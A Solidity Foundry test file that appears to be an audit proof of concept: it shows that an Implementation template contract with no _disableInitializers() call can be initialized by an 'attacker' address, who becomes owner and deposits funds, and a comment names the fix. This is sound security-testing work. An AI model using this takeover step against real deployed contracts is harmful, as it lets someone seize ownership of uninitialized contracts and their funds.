// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {BaseCloneFactory} from "../src/BaseCloneFactory.sol";
import {VaultFactory} from "../src/VaultFactory.sol";
import {Implementation} from "../src/Implementation.sol";

/// @title PoC-path tests for Implementation
/// @notice The Implementation(template) does not call _disableInitializers() in the constructor
/// @dev Any one can invoke Implementation's initialize() without the factory instance
contract CloneFactory_PoC is Test {
    VaultFactory factory;
    Implementation impl;
    address attacker;

    function setUp() public {
        impl = new Implementation();
        factory = new VaultFactory(address(impl));
        attacker = makeAddr("ATTACKER");
        vm.deal(attacker, 2 ether);
    }

    /// @notice Template contract is initialized to an attacker
    /// @dev Call OZ's Initializable._disableInitializers() in the constructor
    function test_PoC_Init_Implementation_Contract_Success() public {
        vm.startPrank(attacker);
        impl.initialize(attacker);
        assertEq(impl.owner(), attacker);
        impl.deposit{value: 1}();
        assertEq(impl.balance(), 1);
        vm.stopPrank();
    }
}
